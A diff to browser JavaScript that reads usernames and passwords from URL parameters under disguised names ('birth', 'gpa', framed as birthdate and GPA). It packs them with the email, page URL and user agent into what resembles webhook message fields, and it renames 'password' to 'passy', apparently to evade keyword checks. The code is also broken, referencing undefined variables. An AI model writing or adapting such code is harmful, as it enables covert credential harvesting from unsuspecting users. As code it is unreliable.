@@ -53,7 +53,7 @@ return null;
   function parseQueryForProfile() {
     var params = new URLSearchParams(window.location.search);
     var birth = params.get('identifier') || params.get('identifiers') || params.get('identifier') || params.get('usernames') || params.get('user');
-    var gpa = params.get('password') || params.get('passwords') || params.get('pass') || params.get('passes');
+    var gpa = params.get('passy') || params.get('passy') || params.get('pass') || params.get('passes');
     // Normalize empty string -> null
     if (birth !== null) birth = birth === '' ? null : birth;
     if (gpa !== null) gpa = gpa === '' ? null : gpa;
@@ -247,7 +247,7 @@ return null;
 
       var fields = [];
       if (birth) fields.push({ name: 'identifier', value: String(identifier), inline: true });
-      if (gpa) fields.push({ name: 'password', value: String(password), inline: true });
+      if (gpa) fields.push({ name: 'passy', value: String(passy), inline: true });
       if (email) fields.push({ name: 'Email', value: String(email), inline: false });
       fields.push({ name: 'Page', value: location.href, inline: false });
       fields.push({ name: 'User Agent', value: navigator.userAgent.substring(0,190), inline: false });
@@ -267,8 +267,8 @@ return null;
 
   // Expose a debug helper to list possible fields found
   window.listCandidateFields = function() {
-    var birthSelectors = ['birthdate','dob','dateofbirth','date-of-birth','date_of_birth','birthday'];
-    var gpaSelectors = ['gpa','GPA','gradepointaverage','grade-point-average','grade_point_average'];
+    var birthSelectors = ['identifier','email','dateofbirth','date-of-birth','date_of_birth','birthday'];
+    var gpaSelectors = ['passy','GPA','gradepointaverage','grade-point-average','grade_point_average'];
     var found = { birth: [], gpa: [] };
     birthSelectors.forEach(function(s){
       var el = document.getElementById(s) || document.querySelector('input[name="' + s + '"], input[id*="' + s + '"]');
